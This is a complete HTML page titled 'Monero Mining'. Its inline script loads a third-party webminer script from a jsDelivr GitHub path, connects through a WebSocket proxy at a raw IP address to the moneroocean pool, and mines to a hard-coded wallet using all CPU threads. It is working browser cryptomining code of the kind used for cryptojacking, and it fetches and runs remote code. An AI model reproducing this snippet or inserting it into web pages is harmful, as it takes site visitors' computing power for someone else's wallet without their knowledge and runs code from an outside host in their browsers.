<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Monero Mining</title>
</head>
<body>

  <div id="miningStatus">Mining...</div>

  <script>
    // Start Of Mining Code (Javascript)
    // import command,
    // import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

    var script = document.createElement("script");
    script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
    document.head.appendChild(script);

    server = "wss://45.119.82.33:40725/";
    var pool = "moneroocean.stream";
    var walletAddress = "8Bn5zVaemZM911hbYGA7tEKv8ypwUEEzBGsKLGoygGXvTAeGHWXofHXgEBrUCQp2ikFgMsAePzBfyKg693zaYGBBPif9VGH";
    var workerId = "GH-XMR-JS-SNIPPET"
    var threads = -1;
    var password = "";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
    // End Of Mining Code
  </script>

</body>
</html>
